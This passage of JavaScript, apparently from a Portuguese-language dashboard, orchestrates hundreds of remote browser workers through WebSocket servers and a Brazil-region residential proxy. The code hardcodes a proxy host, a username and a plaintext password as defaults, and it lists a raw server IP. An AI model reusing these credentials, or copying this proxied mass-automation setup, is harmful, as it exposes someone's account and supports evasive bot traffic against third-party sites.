                    body: JSON.stringify({ enabled: !logsEnabled })
                });
                const result = await response.json();
                if (result.success) {
                    const wasEnabled = logsEnabled;
                    logsEnabled = result.enabled;
                    const btn = document.getElementById('toggle-logs-btn');
                    if (btn) {
                        btn.innerHTML = logsEnabled ? '🔊 Ativado' : '🔇 Desativado';
                        btn.style.background = logsEnabled ? '' : 'linear-gradient(135deg, #ef4444, #dc2626)';
                        btn.title = logsEnabled ? 'Desativar logs' : 'Ativar logs';
                    }
                    // Mostrar mensagem mesmo se logs estiverem desativados (usar wasEnabled temporariamente)
                    const tempState = logsEnabled;
                    logsEnabled = true; // Temporariamente habilitar para mostrar a mensagem
                    addLog('📋 Logs ' + (result.enabled ? 'ativados' : 'desativados'), 'info');
                    logsEnabled = tempState; // Restaurar o estado
                }
            } catch (error) {
                console.error('Erro ao alternar logs:', error);
            }
        }
        
        async function loadLogsStatus() {
            try {
                const response = await fetch('/api/logs-enabled');
                const result = await response.json();
                if (result.success) {
                    logsEnabled = result.enabled;
                    const btn = document.getElementById('toggle-logs-btn');
                    if (btn) {
                        btn.innerHTML = logsEnabled ? '🔊 Ativado' : '🔇 Desativado';
                        btn.style.background = logsEnabled ? '' : 'linear-gradient(135deg, #ef4444, #dc2626)';
                        btn.title = logsEnabled ? 'Desativar logs' : 'Ativar logs';
                    }
                }
            } catch (error) {
                console.error('Erro ao carregar status dos logs:', error);
            }
        }
        
        function addLog(msg, type = 'info') {
            // Verificar se os logs estão habilitados
            if (!logsEnabled) {
                return;
            }
            
            const logs = document.getElementById('logs');
            const time = new Date().toLocaleTimeString('pt-BR');
            logs.innerHTML = '<div class="log-line log-' + type + '">[' + time + '] ' + msg + '</div>' + logs.innerHTML;
            while(logs.children.length > 200) {
                logs.removeChild(logs.lastChild);
            }
        }
        
        function clearLogs() {
            try {
                const logsEl = document.getElementById('logs');
                if (logsEl) {
                    logsEl.innerHTML = '<div class="log-line log-info">[Sistema] Logs limpos</div>';
                }
            } catch (error) {
                console.error('Erro em clearLogs:', error);
            }
        }
        
        async function clearWorkers() {
            try {
                if (isRunning) {
                    addLog('⚠️ Pare os workers antes de limpar!', 'warning');
                    return;
                }
                workers = [];
                const workersGrid = document.getElementById('workers-grid');
                if (workersGrid) {
                    workersGrid.innerHTML = '<div style="grid-column: 1/-1; text-align: center; padding: 2rem; color: #64748b;">Nenhum worker ainda</div>';
                }
                viewMode = 'full'; // Resetar modo de visualização
                // Limpar cache de cards
                if (window.workerCardsCache) {
                    window.workerCardsCache.clear();
                }
                const statTotal = document.getElementById('stat-total');
                const statRunning = document.getElementById('stat-running');
                const statSuccess = document.getElementById('stat-success');
                const statFail = document.getElementById('stat-fail');
                const progressContainer = document.getElementById('progress-container');
                
                if (statTotal) statTotal.textContent = '0';
                if (statRunning) statRunning.textContent = '0';
                if (statSuccess) statSuccess.textContent = '0';
                if (statFail) statFail.textContent = '0';
                if (progressContainer) progressContainer.style.display = 'none';
                
                // Limpar screenshots
                try {
                    await fetch('/api/clear-screenshots', { method: 'POST' });
                } catch (e) {
                    console.debug('Erro ao limpar screenshots:', e);
                }
                
                addLog('🗑️ Workers limpos', 'info');
            } catch (error) {
                console.error('Erro em clearWorkers:', error);
                addLog('❌ Erro ao limpar workers: ' + error.message, 'error');
            }
        }
        
        function updateWorkerCardDOM(card, worker) {
            // Atualizar elementos DOM do card
            if (!card) return;
            
            card.className = 'worker-card ' + (worker.status || 'pending');
            
            const statusEl = card.querySelector('.worker-status');
            const detailsEl = card.querySelector('.worker-details');
            const iconEl = card.querySelector('.worker-icon');
            const simBtn = card.querySelector('.view-simulation-btn');
            
            if (!statusEl || !detailsEl || !iconEl) return;
            
            // Mostrar/ocultar botão de simulação baseado no status
            if (simBtn) {
                if (worker.status === 'success' || worker.status === 'running') {
                    simBtn.style.display = 'inline-block';
                } else {
                    simBtn.style.display = 'none';
                }
            }
            
            // Verificar se existe elemento de título, se não, criar
            let titleEl = card.querySelector('.worker-title');
            if (!titleEl) {
                titleEl = document.createElement('div');
                titleEl.className = 'worker-title';
                const infoEl = card.querySelector('.worker-info');
                if (infoEl && statusEl) {
                    infoEl.insertBefore(titleEl, statusEl.nextSibling);
                }
            }
            
            const statusTexts = {
                'pending': '⏳ Aguardando',
                'running': '🔄 Executando...',
                'success': '✅ Sucesso',
                'error': '❌ Falhou'
            };
            const icons = {
                'pending': '⏳',
                'running': '🔄',
                'success': '✅',
                'error': '❌'
            };
            
            const status = worker.status || 'pending';
            const title = worker.title || '';
            const details = worker.details || '';
            const ip = worker.ip || '';
            
            statusEl.textContent = statusTexts[status] || status;
            iconEl.textContent = icons[status] || '❓';
            
            // TÍTULO EM DESTAQUE (linha separada)
            if (title && title !== 'Sem título') {
                titleEl.textContent = '📌 ' + title.substring(0, 60) + (title.length > 60 ? '...' : '');
                titleEl.style.display = 'block';
            } else {
                titleEl.style.display = 'none';
            }
            
            // Detalhes: Se sucesso, mostrar conteúdo; se erro, mostrar IP
            let detailsText = '';
            if (status === 'success' && ip) {
                // ip agora contém o conteúdo da resposta quando sucesso
                detailsText = '📄 ' + ip;  // Conteúdo da resposta
                if (details) {
                    detailsText += ' | ' + details;
                }
            } else if (ip) {
                // Se erro, mostrar IP normalmente
                detailsText = 'IP: ' + ip;
                if (details) {
                    detailsText += ' | ' + details;
                }
            } else if (details) {
                detailsText = details;
            } else {
                detailsText = '-';
            }
            
            detailsEl.textContent = detailsText;
        }
        
        function updateWorkerCard(id, status, details = '', ip = '', title = '') {
            // Atualizar dados do worker no array
            const worker = workers.find(w => w.id === id);
            if (worker) {
                worker.status = status;
                worker.details = details;
                worker.ip = ip;
                worker.title = title;
            }
            
            // Atualizar cache de cards
            if (!window.workerCardsCache) {
                window.workerCardsCache = new Map();
            }
            
            let card = window.workerCardsCache.get(id);
            if (!card && worker) {
                card = createWorkerCardElement(worker);
                window.workerCardsCache.set(id, card);
            }
            
            if (card && worker) {
                updateWorkerCardDOM(card, worker);
            }
            
            // Se estiver em modo compacto, pode ser necessário re-renderizar grupos
            if (viewMode === 'compact') {
                // Re-renderizar apenas se o status mudou significativamente
                // Para evitar flicker, fazer isso com debounce
                clearTimeout(window.compactRenderTimeout);
                window.compactRenderTimeout = setTimeout(() => {
                    renderWorkers();
                }, 500); // Re-renderizar após 500ms de inatividade
            }
        }
        
        function setViewMode(mode) {
            viewMode = mode;
            const fullBtn = document.getElementById('view-full-btn');
            const compactBtn = document.getElementById('view-compact-btn');
            
            if (fullBtn && compactBtn) {
                fullBtn.classList.toggle('active', mode === 'full');
                compactBtn.classList.toggle('active', mode === 'compact');
            }
            
            renderWorkers();
        }
        
        function renderWorkers() {
            const grid = document.getElementById('workers-grid');
            if (!grid || workers.length === 0) return;
            
            if (viewMode === 'compact' || workers.length > MAX_VISIBLE_CARDS) {
                renderCompactView();
            } else {
                renderFullView();
            }
        }
        
        function renderFullView() {
            const grid = document.getElementById('workers-grid');
            if (!grid) return;
            
            grid.innerHTML = '';
            
            // Renderizar apenas até MAX_VISIBLE_CARDS
            const workersToRender = workers.slice(0, MAX_VISIBLE_CARDS);
            
            // Manter cache de cards para reutilização
            if (!window.workerCardsCache) {
                window.workerCardsCache = new Map();
            }
            
            // Usar DocumentFragment para inserção em lote (muito mais rápido)
            const fragment = document.createDocumentFragment();
            
            workersToRender.forEach(worker => {
                let card = window.workerCardsCache.get(worker.id);
                
                if (!card) {
                    // Criar card se não existir no cache
                    card = createWorkerCardElement(worker);
                    window.workerCardsCache.set(worker.id, card);
                } else {
                    // Atualizar card existente
                    updateWorkerCardDOM(card, worker);
                }
                
                // Clonar para adicionar ao fragment (evita mover o original)
                const cardClone = card.cloneNode(true);
                fragment.appendChild(cardClone);
            });
            
            // Inserir todos de uma vez (muito mais rápido que appendChild individual)
            grid.appendChild(fragment);
            
            // Se houver mais workers, mostrar aviso
            if (workers.length > MAX_VISIBLE_CARDS) {
                const warning = document.createElement('div');
                warning.style.gridColumn = '1/-1';
                warning.style.textAlign = 'center';
                warning.style.padding = '1rem';
                warning.style.color = '#f59e0b';
                warning.style.background = 'rgba(245, 158, 11, 0.1)';
                warning.style.borderRadius = '8px';
                warning.innerHTML = `⚠️ Mostrando ${MAX_VISIBLE_CARDS} de ${workers.length} workers (use modo Compacta para ver todos agrupados)`;
                grid.appendChild(warning);
            }
        }
        
        function renderCompactView() {
            const grid = document.getElementById('workers-grid');
            if (!grid) return;
            
            grid.innerHTML = '';
            
            // Agrupar workers por status
            const groups = {
                'running': { workers: [], title: '🔄 Executando', color: '#f59e0b' },
                'success': { workers: [], title: '✅ Sucesso', color: '#22c55e' },
                'error': { workers: [], title: '❌ Falhas', color: '#ef4444' },
                'pending': { workers: [], title: '⏳ Aguardando', color: '#64748b' }
            };
            
            workers.forEach(worker => {
                if (groups[worker.status]) {
                    groups[worker.status].workers.push(worker);
                }
            });
            
            // Usar DocumentFragment para inserção em lote
            const fragment = document.createDocumentFragment();
            
            // Renderizar grupos
            Object.entries(groups).forEach(([status, group]) => {
                if (group.workers.length === 0) return;
                
                const groupDiv = document.createElement('div');
                groupDiv.className = 'compact-group';
                groupDiv.dataset.status = status;
                
                const header = document.createElement('div');
                header.className = 'compact-group-header';
                header.onclick = () => {
                    groupDiv.classList.toggle('expanded');
                };
                
                header.innerHTML = `
                    <div class="compact-group-title" style="color: ${group.color}">
                        ${group.title}
                    </div>
                    <div class="compact-group-count">${group.workers.length}</div>
                `;
                
                const content = document.createElement('div');
                content.className = 'compact-group-content';
                
                // Renderizar apenas os primeiros 50 de cada grupo inicialmente
                const workersToShow = group.workers.slice(0, 50);
                
                // Usar cache de cards
                if (!window.workerCardsCache) {
                    window.workerCardsCache = new Map();
                }
                
                // Usar fragment para inserção em lote
                const contentFragment = document.createDocumentFragment();
                
                workersToShow.forEach(worker => {
                    let card = window.workerCardsCache.get(worker.id);
                    if (!card) {
                        card = createWorkerCardElement(worker);
                        window.workerCardsCache.set(worker.id, card);
                    } else {
                        updateWorkerCardDOM(card, worker);
                    }
                    contentFragment.appendChild(card.cloneNode(true));
                });
                
                content.appendChild(contentFragment);
                
                // Se houver mais, mostrar aviso
                if (group.workers.length > 50) {
                    const moreDiv = document.createElement('div');
                    moreDiv.style.gridColumn = '1/-1';
                    moreDiv.style.textAlign = 'center';
                    moreDiv.style.padding = '0.5rem';
                    moreDiv.style.color = '#94a3b8';
                    moreDiv.textContent = `... e mais ${group.workers.length - 50} workers (total: ${group.workers.length})`;
                    content.appendChild(moreDiv);
                }
                
                groupDiv.appendChild(header);
                groupDiv.appendChild(content);
                fragment.appendChild(groupDiv);
                
                // Expandir automaticamente se houver poucos workers no grupo
                if (group.workers.length <= 10) {
                    groupDiv.classList.add('expanded');
                }
            });
            
            // Inserir todos os grupos de uma vez
            grid.appendChild(fragment);
        }
        
        function createWorkerCardElement(worker) {
            const card = document.createElement('div');
            card.id = 'worker-' + worker.id;
            card.className = 'worker-card ' + (worker.status || 'pending');
            card.innerHTML = `
                <div class="worker-number">#${worker.id}</div>
                <div class="worker-info">
                    <div class="worker-status">⏳ Aguardando</div>
                    <div class="worker-title" style="display: none;"></div>
                    <div class="worker-details">-</div>
                </div>
                <button class="view-simulation-btn" onclick="viewWorkerSimulation(${worker.id})" id="sim-btn-${worker.id}" style="display: none;">
                    👁️ Ver Simulação
                </button>
                <div class="worker-icon">⏳</div>
            `;
            return card;
        }
        
        function createWorkerCards(numWorkers) {
            const grid = document.getElementById('workers-grid');
            if (!grid) return;
            
            // Limpar apenas se necessário (evita reflow desnecessário)
            if (grid.innerHTML !== '') {
                grid.innerHTML = '';
            }
            workers = [];
            
            // Inicializar cache de cards
            if (!window.workerCardsCache) {
                window.workerCardsCache = new Map();
            }
            
            // Criar array de workers de forma otimizada
            workers = Array.from({ length: numWorkers }, (_, i) => ({
                id: i + 1,
                status: 'pending',
                ip: '',
                details: '',
                title: ''
            }));
            
            // Criar cards no cache apenas se necessário (lazy creation)
            // Não criar todos os cards de uma vez - criar sob demanda durante renderização
            
            // Atualizar estatística total
            const statTotal = document.getElementById('stat-total');
            if (statTotal) statTotal.textContent = numWorkers;
            
            // Renderizar conforme o modo atual (otimizado)
            if (viewMode === 'compact' || numWorkers > MAX_VISIBLE_CARDS) {
                renderCompactView();
            } else {
                renderFullView();
            }
        }
        
        function updateStats() {
            let running = 0, success = 0, fail = 0;
            workers.forEach(w => {
                if (w.status === 'running') running++;
                else if (w.status === 'success') success++;
                else if (w.status === 'error') fail++;
            });
            
            document.getElementById('stat-running').textContent = running;
            document.getElementById('stat-success').textContent = success;
            document.getElementById('stat-fail').textContent = fail;
            
            const completed = success + fail;
            const total = workers.length;
            const pct = total > 0 ? (completed / total * 100) : 0;
            
            document.getElementById('progress-text').textContent = completed + ' / ' + total;
            document.getElementById('progress-fill').style.width = pct + '%';
            
            if (startTime) {
                const elapsed = Math.floor((Date.now() - startTime) / 1000);
                document.getElementById('stat-time').textContent = elapsed + 's';
            }
        }
        
        async function testConnection() {
            try {
                let wsEndpoint = document.getElementById('ws-endpoint').value;
                const proxyServer = document.getElementById('proxy-server').value;
                const proxyUsername = document.getElementById('proxy-username').value;
                const proxyPassword = document.getElementById('proxy-password').value;
                
                if (!wsEndpoint || wsEndpoint.trim() === '') {
                    addLog('❌ Digite um endpoint WebSocket!', 'error');
                    return;
                }
                
                // Adicionar timeout ao endpoint para teste
                wsEndpoint = adicionarTimeoutAoEndpoint(wsEndpoint);
                
                addLog('🔍 Testando conexão com ' + wsEndpoint + '...', 'info');
                
                const response = await fetch('/api/test-connection', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        ws_endpoint: wsEndpoint,
                        proxy_server: proxyServer,
                        proxy_username: proxyUsername,
                        proxy_password: proxyPassword
                    })
                });
                
                const data = await response.json();
                const statusBadge = document.getElementById('server-status');
                
                if (data.success) {
                    if (statusBadge) {
                        statusBadge.className = 'status-badge connected';
                        statusBadge.innerHTML = '🟢 Conectado | IP: ' + (data.ip || 'N/A');
                    }
                    addLog('✅ Conexão OK! IP: ' + data.ip + ' | País: ' + data.country, 'success');
                } else {
                    if (statusBadge) {
                        statusBadge.className = 'status-badge disconnected';
                        statusBadge.innerHTML = '🔴 Erro';
                    }
                    addLog('❌ Erro: ' + (data.error || 'Erro desconhecido'), 'error');
                }
            } catch (error) {
                addLog('❌ Erro: ' + error.message, 'error');
                console.error('Erro em testConnection:', error);
            }
        }
        
        async function saveConfig() {
            try {
                const config = {
                    ws_endpoint: document.getElementById('ws-endpoint').value,
                    proxy_server: document.getElementById('proxy-server').value,
                    proxy_username: document.getElementById('proxy-username').value,
                    proxy_password: document.getElementById('proxy-password').value,
                    default_url: document.getElementById('url-input').value,
                    default_workers: parseInt(document.getElementById('num-workers').value) || 20,
                    use_proxy: document.getElementById('use-proxy').checked
                };
                
                const response = await fetch('/api/save-config', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(config)
                });
                
                if (!response.ok) {
                    throw new Error('Erro HTTP: ' + response.status);
                }
                
                const result = await response.json();
                if (result.status === 'success') {
                    addLog('💾 Configuração salva com sucesso!', 'success');
                } else {
                    addLog('❌ Erro ao salvar: ' + (result.message || 'Erro desconhecido'), 'error');
                }
            } catch (error) {
                addLog('❌ Erro ao salvar configuração: ' + error.message, 'error');
                console.error('Erro em saveConfig:', error);
            }
        }
        
        function setDefaultValues() {
            // Garantir que os valores padrão estejam sempre definidos
            const proxyServer = document.getElementById('proxy-server');
            const proxyUsername = document.getElementById('proxy-username');
            const proxyPassword = document.getElementById('proxy-password');
            
            // Aplicar valores padrão apenas se os campos estiverem vazios
            if (!proxyServer.value || proxyServer.value.trim() === '') {
                proxyServer.value = 'http://pybpm-ins-hxqlzicm.pyproxy.io:2510';
            }
            if (!proxyUsername.value || proxyUsername.value.trim() === '') {
                proxyUsername.value = 'liderbet1-zone-adam-region-br';
            }
            if (!proxyPassword.value || proxyPassword.value.trim() === '') {
                proxyPassword.value = 'Aa10203040';
            }
        }
        
        let serverCounter = 0;
        const serverStatusCache = {}; // Cache de status: se já está verde, não testa novamente
        
        async function testServerConnection(serverId, endpoint) {
            // Adicionar timeout ao endpoint antes de testar
            endpoint = adicionarTimeoutAoEndpoint(endpoint);
            try {
                const statusElement = document.getElementById('status-' + serverId);
                if (!statusElement) {
                    return; // Elemento não existe ainda
                }
                
                // Se já está conectado (verde), não testa novamente
                if (statusElement.classList.contains('connected')) {
                    return;
                }
                
                // Buscar configuração do proxy dos campos de configuração
                const proxyServerEl = document.getElementById('proxy-server');
                const proxyUsernameEl = document.getElementById('proxy-username');
                const proxyPasswordEl = document.getElementById('proxy-password');
                const proxyServer = proxyServerEl ? proxyServerEl.value : 'http://pybpm-ins-hxqlzicm.pyproxy.io:2510';
                const proxyUsername = proxyUsernameEl ? proxyUsernameEl.value : 'liderbet1-zone-adam-region-br';
                const proxyPassword = proxyPasswordEl ? proxyPasswordEl.value : 'Aa10203040';
                
                // Verificar cache - se já foi testado e está conectado, não testa novamente
                const cacheKey = endpoint + '_' + proxyServer;
                if (serverStatusCache[cacheKey] === 'connected') {
                    statusElement.className = 'server-status connected';
                    statusElement.title = 'Conexão bem-sucedida (em cache)';
                    return;
                }
                
                // Mostrar status de teste (laranja)
                statusElement.className = 'server-status testing';
                statusElement.title = 'Testando conexão com proxy...';
                
                // Testar conexão usando a API que testa com proxy
                try {
                    const response = await fetch('/api/test-connection', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            ws_endpoint: endpoint,
                            proxy_server: proxyServer,
                            proxy_username: proxyUsername,
                            proxy_password: proxyPassword
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        statusElement.className = 'server-status connected';
                        statusElement.title = `✅ Conexão OK com proxy | IP: ${data.ip || 'N/A'} | ${data.country || 'N/A'}`;
                        serverStatusCache[cacheKey] = 'connected';
                    } else {
                        statusElement.className = 'server-status disconnected';
                        statusElement.title = `❌ Erro: ${data.error || 'Conexão falhou'}`;
                        serverStatusCache[cacheKey] = 'disconnected';
                    }
                } catch (apiError) {
                    statusElement.className = 'server-status disconnected';
                    statusElement.title = '❌ Erro ao testar conexão';
                    serverStatusCache[cacheKey] = 'disconnected';
                    console.error('Erro ao testar conexão via API:', apiError);
                }
                
            } catch (error) {
                console.error('Erro ao testar conexão do servidor:', error);
                const statusElement = document.getElementById('status-' + serverId);
                if (statusElement) {
                    statusElement.className = 'server-status disconnected';
                    statusElement.title = 'Erro ao testar conexão';
                    const cacheKey = endpoint + '_' + (document.getElementById('proxy-server').value || '');
                    serverStatusCache[cacheKey] = 'disconnected';
                }
            }
        }
        
        function addServer() {
            try {
                serverCounter++;
                const serversList = document.getElementById('servers-list');
                if (!serversList) {
                    console.error('Elemento servers-list não encontrado');
                    return;
                }
                const defaultEndpoint = document.getElementById('ws-endpoint').value || 'ws://50.217.254.165:40422';
                
                const serverCard = document.createElement('div');
                serverCard.className = 'server-card';
                serverCard.id = 'server-' + serverCounter;
                serverCard.innerHTML = `
                    <div class="server-status pending" id="status-${serverCounter}" title="Testando conexão..."></div>
                    <input type="text" class="server-endpoint" 
                           placeholder="ws://IP:PORTA" 
                           value="${defaultEndpoint}"
                           title="WebSocket Endpoint">
                    <input type="number" class="server-workers-input" 
                           placeholder="Workers" 
                           value="50" 
                           min="1" 
                           max="500"
                           title="Número de workers para este servidor">
                    <button class="server-remove-btn" onclick="removeServer(${serverCounter})">🗑️</button>
                `;
                
                serversList.appendChild(serverCard);
                updateServersSummary();
                
                // Testar conexão automaticamente
                testServerConnection(serverCounter, defaultEndpoint);
            } catch (error) {
                console.error('Erro em addServer:', error);
                addLog('❌ Erro ao adicionar servidor: ' + error.message, 'error');
            }
        }
        
        function removeServer(serverId) {
            try {
                const serverCard = document.getElementById('server-' + serverId);
                if (serverCard) {
                    // Limpar cache do endpoint antes de remover
                    const endpointInput = serverCard.querySelector('.server-endpoint');
                    if (endpointInput && endpointInput.value.trim()) {
                        delete serverStatusCache[endpointInput.value.trim()];
                    }
                    serverCard.remove();
                    updateServersSummary();
                }
            } catch (error) {
                console.error('Erro em removeServer:', error);
            }
        }
        
        function clearServers() {
            try {
                if (!confirm('Tem certeza que deseja limpar todos os servidores?')) {
                    return;
                }
                const serversList = document.getElementById('servers-list');
                if (serversList) {
                    serversList.innerHTML = '';
                    serverCounter = 0;
                    // Limpar cache de status
                    Object.keys(serverStatusCache).forEach(key => delete serverStatusCache[key]);
                    updateServersSummary();
                    addLog('🗑️ Servidores limpos', 'info');
                }
            } catch (error) {
                console.error('Erro em clearServers:', error);
                addLog('❌ Erro ao limpar servidores: ' + error.message, 'error');
            }
        }
        
        async function syncVastAI() {
            try {
                addLog('🔄 Buscando instâncias running na Vast.ai...', 'info');
                
                const response = await fetch('/api/sync-vast-ai', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'}
                });
                
                if (!response.ok) {
                    throw new Error('Erro HTTP: ' + response.status);
                }
                
                const result = await response.json();
                
                if (result.status === 'success') {
                    const servers = result.servers || [];
                    const total = result.total || 0;
                    let added = 0;
                    
                    // Verificar quais servidores já existem para evitar duplicatas
                    const existingEndpoints = new Set();
                    document.querySelectorAll('.server-endpoint').forEach(input => {
                        existingEndpoints.add(input.value.trim());
                    });
                    
                    // Adicionar cada servidor retornado
                    for (const server of servers) {
                        // Verificar se já existe
                        if (!existingEndpoints.has(server.endpoint)) {
                            serverCounter++;
                            const serversList = document.getElementById('servers-list');
                            if (serversList) {
                                const serverCard = document.createElement('div');
                                serverCard.className = 'server-card';
                                serverCard.id = 'server-' + serverCounter;
                                serverCard.innerHTML = `
                                    <div class="server-status pending" id="status-${serverCounter}" title="Testando conexão..."></div>
                                    <input type="text" class="server-endpoint" 
                                           placeholder="ws://IP:PORTA" 
                                           value="${server.endpoint}"
                                           title="WebSocket Endpoint">
                                    <input type="number" class="server-workers-input" 
                                           placeholder="Workers" 
                                           value="${server.workers}" 
                                           min="1" 
                                           max="500"
                                           title="Número de workers para este servidor">
                                    <button class="server-remove-btn" onclick="removeServer(${serverCounter})">🗑️</button>
                                `;
                                serversList.appendChild(serverCard);
                                existingEndpoints.add(server.endpoint);
                                added++;
                                
                                // Testar conexão automaticamente
                                testServerConnection(serverCounter, server.endpoint);
                                
                                const label = server.label || `Instance ${server.instance_id}`;
                                // Mostrar memória e número de workers calculados
                                const memInfo = server.cpu_ram_mb ? 
                                    ` - ${server.cpu_ram_gb} GB RAM (${server.workers} workers)` : 
                                    ` - ${server.workers} workers`;
                                addLog(`➕ Adicionado: ${label} (${server.ip})${memInfo}`, 'success');
                            }
                        } else {
                            addLog(`ℹ️ Servidor já existe: ${server.endpoint}`, 'info');
                        }
                    }
                    
                    if (added > 0) {
                        addLog(`✅ ${added} servidor(es) adicionado(s) da Vast.ai (${total} running encontrado(s))`, 'success');
                        updateServersSummary();
                    } else {
                        addLog(`ℹ️ Nenhum servidor novo adicionado. ${total} instância(s) running encontrada(s).`, 'info');
                    }
                } else {
                    addLog('❌ Erro ao sincronizar: ' + (result.message || 'Erro desconhecido'), 'error');
                }
            } catch (error) {
                addLog('❌ Erro ao sincronizar Vast.ai: ' + error.message, 'error');
                console.error('Erro em syncVastAI:', error);
            }
        }
        
        function setAllWorkers() {
            try {
                const globalWorkersInput = document.getElementById('global-workers-input');
                if (!globalWorkersInput) {
                    addLog('❌ Input de workers global não encontrado', 'error');
                    return;
                }
                
                const value = parseInt(globalWorkersInput.value);
                if (isNaN(value) || value < 1 || value > 500) {
                    addLog('⚠️ Valor inválido! Digite um número entre 1 e 500', 'warning');
                    return;
                }
                
                // Buscar todos os inputs de workers dos servidores
                const workerInputs = document.querySelectorAll('.server-workers-input');
                
                if (workerInputs.length === 0) {
                    addLog('ℹ️ Nenhum servidor encontrado para atualizar', 'info');
                    return;
                }
                
                // Atualizar todos os inputs
                let updated = 0;
                workerInputs.forEach(input => {
                    input.value = value;
                    updated++;
                });
                
                // Atualizar resumo dos servidores
                updateServersSummary();
                
                addLog(`✅ ${updated} servidor(es) atualizado(s) para ${value} workers`, 'success');
            } catch (error) {
                addLog('❌ Erro ao atualizar workers: ' + error.message, 'error');
                console.error('Erro em setAllWorkers:', error);
            }
        }
        
        // Função para converter minutos em milissegundos e gerar query string
        function obterTimeoutQueryString() {
            const timeoutInput = document.getElementById('ws-timeout-minutes');
            const minutos = timeoutInput ? parseFloat(timeoutInput.value) : 30;
            
            // Validar e usar valor padrão se inválido
            const minutosValidos = (minutos && minutos > 0) ? minutos : 30;
            
            // Converter minutos para milissegundos (minutos * 60 * 1000)
            const milissegundos = Math.round(minutosValidos * 60 * 1000);
            
            return `?timeout=${milissegundos}`;
        }
        
        // Função para atualizar preview do timeout
        function atualizarTimeoutPreview() {
            const timeoutInput = document.getElementById('ws-timeout-minutes');
            const previewEl = document.getElementById('timeout-preview');
            
            if (timeoutInput && previewEl) {
                const minutos = parseFloat(timeoutInput.value) || 30;
                const milissegundos = Math.round(minutos * 60 * 1000);
                previewEl.textContent = `(${milissegundos.toLocaleString('pt-BR')}ms)`;
            }
        }
        
        // Função auxiliar para adicionar timeout ao endpoint
        function adicionarTimeoutAoEndpoint(endpoint) {
            if (!endpoint || !endpoint.trim()) {
                return endpoint;
            }
            
            // Se o endpoint já tem timeout, não adiciona novamente
            if (endpoint.includes('timeout=')) {
                return endpoint;
            }
            
            // Obter timeout query string (já convertido de minutos para ms)
            const timeoutStr = obterTimeoutQueryString();
            
            // Verificar se já tem query string
            if (endpoint.includes('?')) {
                // Já tem query string, adiciona com &
                return endpoint + '&' + timeoutStr.substring(1); // Remove o ? inicial
            } else {
                // Não tem query string, adiciona com ?
                return endpoint + timeoutStr;
            }
        }
        
        // Função para aplicar timeout a todos os servidores que não têm
        function aplicarTimeoutTodosServidores() {
            try {
                // Obter timeout query string (convertido de minutos para ms)
                const timeoutStr = obterTimeoutQueryString();
                
                if (!timeoutStr || timeoutStr === '?timeout=') {
                    addLog('❌ Configure o timeout primeiro!', 'error');
                    return;
                }
                
                const serverCards = document.querySelectorAll('.server-card');
                let atualizados = 0;
                let jaTinham = 0;
                
                serverCards.forEach(card => {
                    try {
                        const endpointEl = card.querySelector('.server-endpoint');
                        if (endpointEl) {
                            let endpoint = endpointEl.value.trim();
                            
                            // Verificar se já tem timeout
                            if (endpoint.includes('timeout=')) {
                                jaTinham++;
                                return; // Já tem timeout, não precisa atualizar
                            }
                            
                            if (endpoint && endpoint.trim() !== '') {
                                // Remover qualquer query string de timeout antigo (caso exista)
                                endpoint = endpoint.replace(/[?&]timeout=\d+/g, '');
                                
                                // Adicionar timeout ao endpoint
                                if (endpoint.includes('?')) {
                                    // Já tem query string, adiciona com &
                                    endpoint = endpoint + '&' + timeoutStr.substring(1);
                                } else {
                                    // Não tem query string, adiciona com ?
                                    endpoint = endpoint + timeoutStr;
                                }
                                
                                endpointEl.value = endpoint;
                                atualizados++;
                                
                                // Se o servidor estava conectado, limpar status para retestar
                                const statusElement = card.querySelector('.server-status');
                                if (statusElement && statusElement.classList.contains('connected')) {
                                    statusElement.className = 'server-status pending';
                                    statusElement.title = 'Timeout atualizado - Teste novamente';
                                    
                                    // Retestar conexão automaticamente após 500ms
                                    const serverId = card.id.replace('server-', '');
                                    setTimeout(() => {
                                        testServerConnection(serverId, endpoint);
                                    }, 500);
                                } else {
                                    // Se não estava conectado, testar automaticamente
                                    const serverId = card.id.replace('server-', '');
                                    setTimeout(() => {
                                        testServerConnection(serverId, endpoint);
                                    }, 500);
                                }
                            }
                        }
                    } catch (error) {
                        console.error('Erro ao atualizar servidor:', error);
                    }
                });
                
                if (atualizados > 0) {
                    addLog(`✅ Timeout aplicado e atualizado em ${atualizados} servidor(es)`, 'success');
                    updateServersSummary();
                } else if (jaTinham > 0) {
                    addLog(`ℹ️ Todos os servidores já têm timeout configurado (${jaTinham} servidor(es))`, 'info');
                } else {
                    addLog('ℹ️ Nenhum servidor encontrado para atualizar', 'info');
                }
            } catch (error) {
                addLog('❌ Erro ao aplicar timeout: ' + error.message, 'error');
                console.error('Erro em aplicarTimeoutTodosServidores:', error);
            }
        }
        
        function getServers() {
            try {
                const servers = [];
                const serverCards = document.querySelectorAll('.server-card');
                
                serverCards.forEach(card => {
                    try {
                        const endpointEl = card.querySelector('.server-endpoint');
                        const workersEl = card.querySelector('.server-workers-input');
                        
                        if (endpointEl && workersEl) {
                            let endpoint = endpointEl.value.trim();
                            const workers = parseInt(workersEl.value) || 0;
                            
                            // Adicionar timeout ao endpoint
                            endpoint = adicionarTimeoutAoEndpoint(endpoint);
                            
                            // Verificar se o servidor tem status verde (conectado)
                            const statusElement = card.querySelector('.server-status');
                            const isConnected = statusElement && statusElement.classList.contains('connected');
                            
                            // Incluir apenas servidores conectados (verde) e com dados válidos
                            if (endpoint && workers > 0 && isConnected) {
                                servers.push({
                                    endpoint: endpoint,
                                    workers: workers
                                });
                            }
                        }
                    } catch (error) {
                        console.error('Erro ao processar card de servidor:', error);
                    }
                });
                
                return servers;
            } catch (error) {
                console.error('Erro em getServers:', error);
                return [];
            }
        }
        
        function updateServersSummary() {
            try {
                const servers = getServers();
                const summary = document.getElementById('servers-summary');
                const startBtn = document.getElementById('start-btn');
                const totalWorkers = servers.reduce((sum, s) => sum + s.workers, 0);
                
                if (servers.length > 0) {
                    if (summary) {
                        summary.textContent = `📊 ${servers.length} servidor(es) | ${totalWorkers} workers total`;
                    }
                    if (startBtn) {
                        startBtn.innerHTML = `🚀 Iniciar ${totalWorkers} Workers`;
                    }
                } else {
                    if (summary) {
                        summary.textContent = 'Nenhum servidor configurado';
                    }
                    if (startBtn) {
                        const numWorkersEl = document.getElementById('num-workers');
